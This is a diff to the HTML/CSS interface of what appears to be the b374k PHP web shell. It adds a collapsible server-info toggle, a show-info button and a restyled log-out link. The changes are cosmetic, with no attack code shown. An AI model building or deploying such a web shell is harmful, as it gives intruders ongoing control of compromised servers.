@@ -17,9 +17,13 @@
 <style type="text/css">
 <__CSS__>
 #navigation{position:fixed;left:-16px;top:46%;}
-#totop,#tobottom{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;}
+#totop,#tobottom,#toggleBasicInfo{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}
 #totop:hover,#tobottom:hover{opacity:0.80;}
+#toggleBasicInfo{display:none;float:right;margin:0;}
+#basicInfoSplitter{display:none;}
 #tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}
+#showinfo{float:right;display:none;}
+#logout{float:right;}
 </style>
 </head>
 <body>
@@ -30,9 +34,10 @@
 		<!--header info start-->
 		<div id='headerNav'>
 			<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
-			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' /><span id='nav'>&nbsp;<?php echo $nav; ?></span>
+			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
 
-			<a id='logout'>log out</a>
+			<a class='boxclose' id='logout' title='log out'>x</a>
+			<a class='boxclose' id='showinfo' title='show info'>v</a>
 		</div>
 		<!--header info end-->
 
@@ -53,6 +58,7 @@
 	<div id='content'>
 		<!--server info start-->
 		<div id='basicInfo'>
+			<div id='toggleBasicInfo'></div>
 			<?php
 			echo $error_html;
 			foreach(get_server_info() as $k=>$v){
